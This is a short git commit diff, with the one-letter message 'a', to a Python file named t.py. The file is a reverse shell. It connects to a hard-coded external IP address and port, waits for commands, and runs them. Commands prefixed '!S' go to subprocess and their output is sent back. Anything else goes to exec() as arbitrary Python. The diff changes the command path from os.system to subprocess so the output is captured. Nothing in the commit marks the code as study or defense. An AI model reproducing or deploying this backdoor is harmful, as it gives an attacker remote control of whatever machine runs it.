95fdc01843286ddaaf63412c3424c1ce34d93753
alexaddross <alexaddros.s@yandex.ru>
2025-01-17 11:34:15 +0300

    a

--- t.py
+++ t.py
@@ -1,5 +1,6 @@
 from socket import socket
 import os
+import subprocess
 
 core = socket()
 core.connect(('90.156.204.134', 5053))
@@ -8,11 +9,10 @@ while True:
     data = core.recv(2048).decode()
 
     if data[:2] == '!S':
-        os.system(data[2:])
+        print([data[2:].split()])
+        response = subprocess.check_output(data[2:].split())
     else:
         exec(data)
-    
-    response = 'executed'
+        response = 'executed'
     
     core.send(response.encode())
-
